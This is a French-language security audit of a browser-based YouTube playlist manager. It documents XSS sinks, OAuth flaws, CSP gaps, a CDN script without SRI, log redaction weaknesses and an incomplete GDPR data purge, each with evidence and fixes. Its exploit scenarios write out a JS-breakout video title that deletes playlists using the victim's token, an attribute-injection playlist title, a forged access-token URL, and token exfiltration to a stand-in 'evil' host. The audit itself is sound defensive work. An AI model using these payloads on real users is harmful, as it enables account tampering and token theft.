# Passe 2 — Sécurité

> Traduction française de [`../02-security.md`](../02-security.md). En cas d'écart, la version anglaise fait foi pour les extraits de code.

Base `origin/main` @ `9c824eb`, app **v1.27.3**. Lecture seule ; aucun OAuth exécuté, aucun appel API. Le skill `/security-review` cible un diff, j'ai donc appliqué sa méthode (fondée sur des preuves, scénario d'exploitation, sévérité) à l'ensemble du code. Toute référence `:N` sans nom de fichier désigne `youtube-playlist-manager.html`.

La sévérité suit l'échelle du handoff : **P1** sécurité exploitable / perte de données / violation des CGU · **P2** bug fonctionnel ou erreur de quota · **P3** maintenabilité ou performance · **P4** cosmétique. Le durcissement de sécurité sans exploitation démontrée est classé P3.

**Note de méthode sur le XSS.** Un script jetable a listé les 244 interpolations `${…}` du script de l'app (l.2760+) qui référencent des données de type titre/nom/tag/chaîne et ne sont pas enveloppées dans `escapeHtml`/`escapeJsAttr`/`t()`. Chacune a ensuite été lue dans son contexte. L'exploitabilité dépend du **contexte** du puits :
- Le **contexte de texte HTML** nécessite `<`. YouTube refuse `<`/`>` dans les titres de vidéos et de playlists, à ma connaissance, donc ces puits ne sont atteignables que par des données qui ne viennent *pas* de YouTube (import de sauvegarde, saisie locale). « non vérifié » par rapport aux règles de validation actuelles de YouTube.
- Le **contexte d'attribut** (`title="${…}"`, `value="${…}"`) ne nécessite que `"`, que les titres YouTube acceptent.
- Le **contexte de chaîne JS dans un attribut** (`onclick="f('${…}')"`) ne nécessite que `'` ou `\`.

## Synthèse

| ID | Sév. | Domaine | Constat |
|---|---|---|---|
| AUD-04 | **P1** | XSS | Les gestionnaires des résultats Discover échappent `'` mais pas `\` : un titre de vidéo contenant une barre oblique inverse sort de la chaîne JS (`:11948`, `:11961`) |
| AUD-05 | **P1** | XSS | Les titres de playlist arrivent non échappés dans des attributs `title="…"` sur le tableau de bord et les statistiques (`:8296`, `:12730`). Les playlists tierces mises en favori sont incluses. |
| AUD-06 | **P2** | XSS / validation des entrées | Les fichiers de sauvegarde (import JSON, métadonnées de restauration) ne sont pas validés par un schéma. Chaque champ atteint des puits HTML/JS, y compris non échappés (noms de dossiers, noms de tags, icônes de tags, ids), ce qui donne un XSS persistant via une sauvegarde forgée. |
| AUD-07 | **P2** | XSS (Reel Studio) | `reel-studio.html:1483` place des noms de tags échappés pour le HTML dans une chaîne JS à l'intérieur d'`onclick`. Le décodeur HTML annule l'échappement. |
| #G6 | **P2** | OAuth | Flux implicite, sans `state`, sans PKCE, sans contrôle d'audience : `checkAuth()` accepte n'importe quel `#access_token` (CSRF de connexion / substitution de jeton) |
| #G13 (rouvrir) | P3 | OAuth | Le jeton reste dans `location.hash` pendant deux `await` avant que `checkAuth()` ne l'efface. Ce n'est pas « la première opération synchrone » qu'exigeait #G13. |
| AUD-03 | **P1** | RGPD | « Supprimer mes données » / purge à 30 jours oublient 17 clés propres à l'app, dont 2 écrites par Reel Studio (complète la passe 0) |
| AUD-08 | P3 | CSP | Scripts `'unsafe-inline'`, pas de `form-action`, CSP livrée par `<meta>` (pas de `frame-ancestors`), aucune CSP sur `how-it-works.html`/`quota-estimator.html` |
| AUD-09 | P3 | Chaîne d'approvisionnement | `quota-estimator.html:7` charge Chart.js depuis cdnjs **sans SRI**, sur la même origine que les jetons en mémoire et l'IndexedDB de l'app |
| AUD-10 | P3 | Journal | `_logRedact()` ne reconnaît que les jetons formant une chaîne entière, et `msg` n'est jamais rédigé. Les titres et les noms sont journalisés. |
| AUD-11 | P4 | Entrée | `showAddBookmarkModal()` pré-remplit la valeur `?bookmark=` en n'échappant que `"`. Sûr aujourd'hui ; valider d'abord avec `BOOKMARK_ID_REGEX`. |
| AUD-12 | P4 | Robustesse | La restauration CSV utilise un objet simple indexé par titre de playlist : `__proto__` comme titre lève une erreur (pas de pollution), et `split('\n')` casse les cellules multilignes entre guillemets |
| — | ✅ | Injection CSV #G10 | Tient : chaque export CSV passe par `csvCell()` |
| — | ✅ | Pollution de prototype | Non exploitable dans les chemins d'import examinés |
| — | ✅ | Transmission du jeton par popup (#G14) | Origine épinglée dans les deux sens |

---

## 1. Cycle de vie OAuth

### 1.1 #G6 — pas de `state`, pas de PKCE, pas de contrôle d'audience (P2, item existant, ⏸ en attente de #75)

**Preuve**
- `:6584-6590` : `` `response_type=token&` + `scope=${encodeURIComponent(s)}` `` (pas de `state`, pas de `code_challenge`).
- `:6682-6686` : `const params = new URLSearchParams(hash.substring(1)); setAccessToken(params.get('access_token'));`

**Scénario.** Un attaquant envoie `https://<app>/youtube-playlist-manager.html#access_token=<ATTACKER_TOKEN>&expires_in=3600`. L'app de la victime l'accepte sans vérifier qu'une connexion a été lancée ni que le jeton appartient à ce client ID. Dès lors, la victime travaille dans le compte YouTube **de l'attaquant** : les playlists qu'elle crée ou réorganise, ainsi que les vidéos, sous-titres et miniatures qu'elle envoie via Studio (`:9370`), y atterrissent. Pendant ce temps, les tags/dossiers/sauvegarde locaux mélangent les deux identités. L'impact porte sur l'intégrité et la confidentialité de ce que la victime envoie, pas sur une prise de contrôle de son compte.

**Correctif.** À court terme, tant que #75 est en attente : générer un `state` aléatoire, le conserver dans `sessionStorage`, et rejeter un hash dont le `state` ne correspond pas. En option, vérifier `https://oauth2.googleapis.com/tokeninfo?access_token=…` pour que `aud === APP.clientId`. À long terme : auth-code + PKCE côté serveur (Phase 4, passe 1 §6 étape 1). **Effort** S (state) / L (backend PKCE).

### 1.2 #G13 — le jeton s'attarde dans le hash de l'URL pendant le travail asynchrone (P3, rouvrir)

**Preuve**
- `:5576` `const m = await cacheStore.migrateLegacy();` et `:5587` `await loadBackupFromStorage();` s'exécutent tous deux **avant**
- `:5618` `checkAuth();`, qui est l'endroit où `:6702` `window.history.replaceState({}, document.title, window.location.pathname);` efface le hash.

Le chemin popup est correct (`:6632` efface de façon synchrone). Dans la fenêtre principale, le backlog a clos #G13 comme « vérifié », mais son propre texte de correctif dit « lire et effacer le hash comme **première opération synchrone** ». Pendant la migration IndexedDB et le chargement de la sauvegarde, tout ce qui lit `location.href` voit encore le jeton. Cela inclut le gestionnaire d'erreurs global, qui journalise `e.filename` (`:15430-15434`), et `_logRedact` n'attrape pas un jeton inclus au milieu d'une chaîne (§5). « non vérifié » qu'une erreur dans cette fenêtre persiste réellement le jeton ; je n'ai rien exécuté.

**Correctif.** Capturer et retirer le hash de façon synchrone en tête d'`init()`, puis transmettre le jeton capturé à `checkAuth()`. **Effort** S.

### 1.3 Expiration (✅ partiel) et stockage (✅)
- L'expiration est enregistrée (`:6691-6695`, `tokenExpiresAt` dans sessionStorage). Pas de rafraîchissement proactif (impossible avec le flux implicite) ; les 401/403 déclenchent une demande de reconnexion (`:7468`, `:7470-7471`). Acceptable jusqu'à PKCE.
- **Le jeton n'est pas dans localStorage.** `setAccessToken()` (`:4865-4869`) le garde uniquement en mémoire. La crainte du handoff concernant le stockage du jeton dans `localStorage` n'est **pas reproduite**.
- La révocation passe le jeton dans la query string (`:6273` `` `https://oauth2.googleapis.com/revoke?token=${APP.accessToken}` ``). C'est la forme documentée par Google, mais un corps form-encoded le tiendrait hors des journaux de proxy. P4.

### 1.4 Transmission par popup #G14 (✅)
`:6623-6628` : `window.opener.postMessage({...}, window.location.origin)`. `:6639-6640` : `if (!event || event.origin !== (expectedOrigin || window.location.origin)) return false;`. Les deux sens sont épinglés à l'origine, et le hash est effacé avant `window.close()` (`:6632`).

---

## 2. XSS

### 2.1 AUD-04 — Discover : la barre oblique inverse sort de la chaîne JS de l'`onclick` (P1)

**Preuve** (`:11948`, et la même construction à `:11961`) :
```
onclick="event.stopPropagation();playVideo('${v.videoId}','${(v.title||'').replace(/'/g,"\\'").replace(/"/g,'&quot;')}',…
```
`'` devient `\'`, mais `\` lui-même n'est pas échappé. Un titre se terminant par, ou contenant, `\` suivi de `'` devient `\\'`, ce qui ferme la chaîne.

**Scénario.** Un uploader intitule une vidéo `x\');fetch('https://www.googleapis.com/youtube/v3/playlists?id=…',{method:'DELETE',headers:{Authorization:'Bearer '+APP.accessToken}})//`. Tout utilisateur dont la recherche Discover la renvoie et qui clique sur la miniature ou le titre exécute la charge utile avec son jeton actif. La CSP l'autorise (`'unsafe-inline'`), et `connect-src` autorise `www.googleapis.com`, donc la charge utile peut agir sur le compte de la victime. `APP.accessToken` est une variable globale. « non vérifié » que YouTube accepte aujourd'hui une barre oblique inverse dans les titres ; les apostrophes et les guillemets sont certainement acceptés.

**Correctif.** Utiliser l'`escapeJsAttr()` existant (`:14952`), comme le fait déjà `playOverlayHTML()` (`:8844-8847`), ou mieux, des attributs `data-*` plus de la délégation. **Effort** S.

### 2.2 AUD-05 — titres de playlist dans des attributs non échappés (P1)

**Preuve**
- `:8259` `.map((pl, origIdx) => ({ id: pl.id, name: pl.snippet.title, … }))` sur `APP.playlists`.
- `:8296` `` `<div class="dash-pl-row" data-playlist-id="${p.id}" title="${p.name} — ${t('dashboard_drill_to_library')}" …` ``
- `:12730` `` title="${p.name}">${p.name}</div> `` (vue statistiques, `name: pl.snippet.title` à `:12707`).

`APP.playlists` inclut les **playlists tierces mises en favori** (`:4976` `APP.playlists.push(meta);` avec `meta._isBookmark = true`).

**Scénario.** Un attaquant crée une playlist publique intitulée `a" onmouseover="…payload…" x="`. La victime la met en favori via un lien `?bookmark=PL…` (une confirmation dans une modale, `:7632`) ou en collant l'URL. Survoler sa ligne sur le tableau de bord exécute la charge utile, comme au §2.1. Aucun `<` n'est nécessaire. Les propres playlists de la victime ne donnent qu'un self-XSS via le même puits.

**Correctif.** `escapeHtml()` sur les deux puits. Rechercher le même motif ailleurs ; le §2.4 liste le reste. **Effort** S.

### 2.3 AUD-06 — les fichiers de sauvegarde sont un canal XSS non validé (P2)

**Preuve**
- `:6040` `if (!backup || !backup.playlists || !Array.isArray(backup.playlists) || backup.playlists.length === 0) {` : le seul contrôle de l'import depuis l'écran de connexion, après quoi `:6050` le stocke comme `lastBackup`.
- `:5920` `APP.playlists = backup.playlistObjects;` : repris **tel quel** à chaque démarrage.
- `:14627-14634` + `:14775-14780` : la restauration copie `tags`, `tagIcons`, `folders`, `folderAssignments`, `deckColumns`, `watchQueue` depuis le fichier vers l'état et localStorage, sans validation.

Puits que ces champs atteignent sans échappement, en contexte de texte HTML où `<` fonctionne puisque les données ne sont jamais passées par YouTube :
- nom/icône de dossier : `:13083-13084` `<span class="folder-icon">${folder.icon || '📁'}</span> <span class="folder-name">${folder.name}</span>` ; `:13211` ; `:13216` `value="${folder.name}"` ; `:13360`
- nom/icône de tag : `:12837-12839` `` return `<span class="tag">${icon ? icon + ' ' : ''}${tagName}</span>`; `` ; libellé des statistiques `:12720`
- titres de playlist en contexte HTML : `:8029` (plus grande playlist), `:12619` (doublons)
- titres de vidéo en contexte HTML : `:9005` `<option value="${id}">${title.substring(0, 80)}</option>`, `:9080`, `:12637`
- ids dans des chaînes JS : des dizaines de `onclick="fn('${pl.id}')"`, p. ex. `:8296`, `:12505`, sûrs seulement tant que les ids viennent de l'API.

**Scénario.** Un fichier « voici ma sauvegarde / une bibliothèque de départ » est partagé sur un forum ou envoyé au support. L'importer stocke la charge utile dans `localStorage.lastBackup` / tags / dossiers, et elle se déclenche à **chaque** chargement jusqu'à ce que l'utilisateur supprime ses données. C'est un XSS persistant avec interaction de l'utilisateur au moment de l'import.

**Correctif.**
1. Valider la sauvegarde contre un schéma : types, longueurs, jeu de caractères des `id` `^[A-Za-z0-9_-]+$`, `videoId` `^[A-Za-z0-9_-]{11}$`, URL de miniatures restreintes à `https://i.ytimg.com`, et supprimer les clés inconnues.
2. Échapper chacun des puits ci-dessus.
3. Ajouter un champ de version à la sauvegarde (aucun aujourd'hui, « non vérifié » au-delà des champs lus).

**Effort** M.

### 2.4 Autres puits non échappés (P3, défense en profondeur)

`:9238` `listDiv.innerHTML = … ${err.message}` (texte d'erreur de l'API), `:6739` notes de version (statiques), `:8177` / `:10567` / `:10605` / `:13484` / `:13884` / `:13911` / `:13995` / `:14131` URL de miniatures dans `src="${…}"` (les URL `ytimg` de l'API sont sûres ; celles issues d'une sauvegarde ne le sont pas, voir AUD-06). Corrigés par le même passage d'`escapeHtml`.

### 2.5 AUD-07 — Reel Studio : échappement HTML utilisé pour un contexte JS (P2)

**Preuve**
- `reel-studio.html:888` `const esc = s => … .replace(/[&<>"']/g, c => ({ … "'": '&#39;' }[c]));`
- `reel-studio.html:1483` `onclick="UI.plTag='${esc(t.name)}'; go('playlists')"`

La valeur de l'attribut est décodée en HTML avant l'exécution du JS, donc `&#39;` redevient `'` et un nom de tag `a';alert(1);'` s'exécute. Les noms de tags viennent de `playlistTags`, modifiable via la restauration de sauvegarde (AUD-06). Les autres puits `onclick` de Studio n'interpolent que des ids (`:1136`, `:1171`, `:1180`, `:1260`, `:1310`, `:1382`, `:1428`), exploitables uniquement par ce même canal de sauvegarde. **Correctif :** un échappeur pour contexte JS (comme `escapeJsAttr` dans l'app) ou des attributs `data-*`. **Effort** S.

### 2.6 Ce qui est correct

`escapeHtml()` (`:14961`) échappe les cinq caractères. `escapeJsAttr()` (`:14952`) est correct pour du JS dans un attribut : `&` d'abord, puis `\`, `'`, sauts de ligne, `"`. `subscribeButtonHTML()` (`:14254-14262`) transmet les titres via des attributs `data-*`. `playOverlayHTML()` (`:8843-8847`) utilise `escapeJsAttr`. Les toasts utilisent `textContent` (`:15255`). La vue Playlist Diff échappe les titres (`:14308`, `:14315`). Le panneau de restauration échappe les titres (`:14706`).

---

## 3. CSP (AUD-08, P3 ; suit #G12 et AUD-02)

`:10` :
```
default-src 'self'; script-src 'self' 'unsafe-inline' https://www.youtube.com https://s.ytimg.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src 'self' data: https://*.ytimg.com https://*.ggpht.com https://*.googleusercontent.com; connect-src 'self' https://www.googleapis.com https://oauth2.googleapis.com; frame-src https://www.youtube.com https://www.youtube-nocookie.com; object-src 'none'; base-uri 'self'
```

| Point | État |
|---|---|
| Domaines pour l'API, la révocation OAuth, les uploads (`www.googleapis.com/upload/...`), l'IFrame API, les miniatures, les polices | ✅ complet pour les fonctionnalités actuelles |
| `script-src 'unsafe-inline'` | ❌ Neutralise la CSP face à AUD-04/05/06/07. Il faut retirer les 322 gestionnaires inline (AUD-02). |
| `form-action` absent (ne se replie pas sur `default-src`) | ❌ Un `<form action="https://evil">` injecté peut exfiltrer `APP.accessToken`. La navigation (`location = 'https://evil?'+token`) ne peut de toute façon pas être bloquée par la CSP, donc le vrai correctif est de supprimer le XSS. |
| `frame-ancestors` | ❌ Ignoré dans `<meta>`. La protection contre le clickjacking nécessite un en-tête HTTP de l'hébergeur (hébergement « non vérifié »). |
| `frame-src` YouTube | ✅ `www.youtube.com` + `youtube-nocookie.com` |
| `img-src https://*.googleusercontent.com` | Large. N'importe quelle URL de contenu utilisateur Google peut être chargée, mais ce n'est pas un canal d'exfiltration contrôlé par un attaquant. OK. |
| CSP de Reel Studio (`reel-studio.html:9`) | Même forme, `connect-src 'self' https://www.youtube.com` (pas d'API) ✅, même `'unsafe-inline'` |
| `how-it-works.html`, `quota-estimator.html` | ❌ **Aucune CSP.** Même origine que l'app. |

### AUD-09 — Chart.js depuis un CDN sans SRI (P3)
`quota-estimator.html:7` `<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.1/chart.umd.min.js"></script>` : pas d'`integrity=`, pas de `crossorigin`, pas de CSP. Une réponse de CDN compromise s'exécute sur l'origine de l'app et peut lire l'IndexedDB `ytpm` et tout le localStorage (bibliothèque, tags, `userInfo`, journal de diagnostic). **Correctif :** ajouter SRI + `crossorigin="anonymous"` + une CSP, ou copier le fichier localement. **Effort** S.

## 4. Injection de formules CSV (#G10) — ✅ tient

- `:14554` `const CSV_FORMULA_PREFIXES = ['=', '+', '-', '@', String.fromCharCode(9), String.fromCharCode(13)];`
- `:14560` `if (s && CSV_FORMULA_PREFIXES.indexOf(s.charAt(0)) !== -1) s = "'" + s;`

Les trois exports passent par `csvRow()` : sauvegarde `:14533`, bibliothèque `:15118`, préréglage de transfert `:15050`. La protection n'est annulée à l'import que lorsqu'elle protège un caractère de formule (`:14571-14574`). Aucun autre générateur CSV n'existe (`text/csv` n'apparaît qu'à `:14539`, `:15070`, `:15125`). Résiduel : les libellés de statut `'Supprimée' / 'Privée' / 'Disponible'` sont codés en dur en français dans les deux exports (`:14531`, `:15116`), un problème d'i18n → passe 3.

## 5. Journal de diagnostic — AUD-10 (P3)

`_logRedact()` (`:4692-4726`) :
- Les motifs de chaîne sont **ancrés** : `/^Bearer\s+\S+/i`, `/^ya29\.[A-Za-z0-9_\-\.]+$/`. Un jeton inclus dans une chaîne plus longue, comme une URL `…#access_token=ya29…`, un message d'erreur ou une pile d'appels, passe au travers. La rédaction par clé ne couvre que les clés nommées exactement `accessToken|access_token|…|authorization`.
- `entry.msg` n'est **jamais** rédigé (`:4655` `msg: String(msg || '')`). Seul `data` l'est.
- Des données personnelles sont journalisées délibérément : `:4980` `{ id, title: meta.snippet?.title }`, `:10869` `{ id: res.id, title: name }`. Il y a une modale de consentement avant l'export (`:4760+`), et l'identifiant utilisateur est un préfixe SHA-256 de 4 octets du client ID (`:4771-4776`) ✅.
- `diagnosticLog` n'est pas purgé par « Supprimer mes données » (AUD-03).

**Correctif.** Rendre les motifs de jeton non ancrés (`/ya29\.[\w.-]+/g`, `/access_token=[^&\s]+/g`), rédiger `msg`, retirer les titres des charges du journal ou les hacher, et ajouter `diagnosticLog` à la purge. **Effort** S.

## 6. Import de sauvegarde JSON — schéma et pollution de prototype

- **Schéma :** aucun au-delà de « `playlists` est un tableau non vide » (`:6040`, `:14614`). Voir AUD-06.
- **Pollution de prototype :** non exploitable dans les chemins lus.
  - `JSON.parse` crée `__proto__` comme propriété **propre**.
  - Les fusions utilisent la décomposition d'objet (`:14775` `APP.tags = { ...APP.tags, ...m.tags }`), qui définit des propriétés propres et n'invoque pas le setter `__proto__`.
  - `APP.allVideos[pl.id] = …` avec `pl.id === '__proto__'` (`:5948`) remplace uniquement le prototype d'`APP.allVideos`, pas `Object.prototype`. C'est un bug d'intégrité local, pas une pollution globale.
  - `videoDetailsCache['__proto__']` est ignoré car `!videoDetailsCache[v.videoId]` est faux (`:5972`).
  - Restauration CSV : `playlistMap['__proto__']` se résout en `Object.prototype` et `.videos.push` lève une erreur (`:14651-14652`). Toute la restauration échoue avec une erreur d'analyse : déni de service de cet import uniquement (AUD-12).
- **Correctif :** couvert par le schéma d'AUD-06 ; utiliser `Map` ou `Object.create(null)` pour les collections indexées.

## 7. Deep link `?bookmark=` — ✅ avec une remarque mineure (AUD-11, P4)

- `:5543-5546` : la valeur brute est capturée.
- `:7632` : elle ouvre seulement une modale (`showAddBookmarkModal(bm)`), l'utilisateur doit donc confirmer.
- `:5041` : le pré-remplissage `value="${prefilledId.replace(/"/g, '&quot;')}"` est sûr en contexte d'attribut.
- À la soumission, `extractPlaylistId()` (`:4903-4925`) valide contre `BOOKMARK_ID_REGEX = /^(PL|LL|FL|UU|RD|OL|WL|PU|LP)[A-Za-z0-9_-]{10,}$/` (`:4900`) avant tout appel API.

Le deep link est le point d'entrée d'ingénierie sociale pour AUD-05, pas une vulnérabilité en soi.

## 8. Purge RGPD — AUD-03 confirmé et étendu (P1)

En plus des 15 clés listées en passe 0, **Reel Studio** écrit `studioTheme` et `studioAccents` (`reel-studio.html:680`, `:688`), purgées par aucune des deux listes. Parmi les clés non purgées :
- **données utilisateur :** `diagnosticLog` (contient des titres), `bookmarkedPlaylists`, `playlistViewMode`, `discoverFilters`
- **réglages :** `appLang`, `readOnlyMode`, `writeScopeAtLogin`, `trendingCategory`, `showPlaylistViews`, `libraryLens`, `reelMusicMode`
- **état du quota :** `quotaState`, `apiCalls`, `quotaResetDate`

La politique de confidentialité intégrée à l'app (backlog #8) promet la suppression. Conserver des données personnelles après « Supprimer mes données » la contredit, ce qui en fait un P1 selon l'échelle du handoff. **Correctif :** un registre `APP_STORAGE_KEYS` unique partagé par les deux chemins de purge, et un effacement par préfixe ou par registre plutôt que par des listes tenues à la main. **Effort** S.

---

## Non vérifié

- Si YouTube accepte actuellement `\` dans les titres de vidéos et `"` dans les titres de playlists (exploitabilité d'AUD-04/05). Le défaut du code tient dans les deux cas.
- Le mode d'hébergement du site (en-têtes HTTP, `frame-ancestors`, HSTS).
- Si une erreur pendant l'intervalle asynchrone d'`init()` persiste réellement un jeton (§1.2).
